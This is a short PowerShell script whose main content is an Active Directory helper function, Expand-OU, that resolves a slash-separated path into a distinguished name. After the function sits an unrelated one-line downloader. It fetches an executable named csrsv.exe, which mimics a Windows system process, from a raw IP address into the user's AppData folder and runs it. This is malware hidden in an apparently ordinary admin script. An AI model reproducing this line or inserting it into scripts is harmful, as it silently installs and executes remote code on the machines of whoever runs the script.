





function Expand-OU ($searchroot) {
    $searchrootarray = $searchroot.split('/') | ? {$_ -and $_ -notmatch '^(?:\s+)?$'}

    $dn = ([adsi]"LDAP://$($searchrootarray[0])").distinguishedname.ToString()

    $searchrootarray = $searchrootarray | select -Skip 1

    foreach ($obj in $searchrootarray) {
        $query = Get-ADObject -Filter * -SearchBase $dn -SearchScope OneLevel | select name, distinguishedname
        if ($obj -in $query.name) {
            $dn = ($query | ? name -eq $obj).distinguishedname
        } else {
            throw "could not find '$obj' in '$dn'"
        }
    }

    Write-Output $dn
}

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

